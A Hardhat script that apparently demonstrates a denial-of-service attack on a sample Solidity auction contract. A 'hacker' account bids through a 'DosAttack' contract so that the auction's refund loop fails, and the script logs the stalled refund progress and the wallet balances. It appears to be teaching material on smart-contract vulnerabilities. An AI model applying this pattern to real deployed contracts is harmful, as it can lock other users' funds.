const hre = require('hardhat')
const ethers = hre.ethers

async function main() {
  const [user1, user2, hacker] = await ethers.getSigners()

  const DosAuction = await ethers.getContractFactory("DosAuction", user1)
  const auction = await DosAuction.deploy()
  await auction.deployed()

  const DosAttack = await ethers.getContractFactory("DosAttack", hacker)
  const attack = await DosAttack.deploy(auction.address)
  await attack.deployed()

  const txBid = await auction.bid({value: ethers.utils.parseEther('15.0')})
  await txBid.wait()

  const txAttackBid = await attack.connect(hacker).doBid({value: 100})
  await txAttackBid.wait()

  const txUserBid = await auction.connect(user2).bid({
    value: ethers.utils.parseEther('20.0')
  })
  await txUserBid.wait()

  console.log("Auction balance", await ethers.provider.getBalance(auction.address))

  try {
    const txRefund = await auction.refund()
    await txRefund.wait()
  } catch(e) {
    console.error(e)
  } finally {
    console.log("Refund progress", await auction.refundProgress())

    console.log("#1 wallet balance: ", await ethers.provider.getBalance(user1.address))
    console.log("#0xHacker wallet balance: ", await ethers.provider.getBalance(hacker.address))
    console.log("#2 wallet balance: ", await ethers.provider.getBalance(user2.address))
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })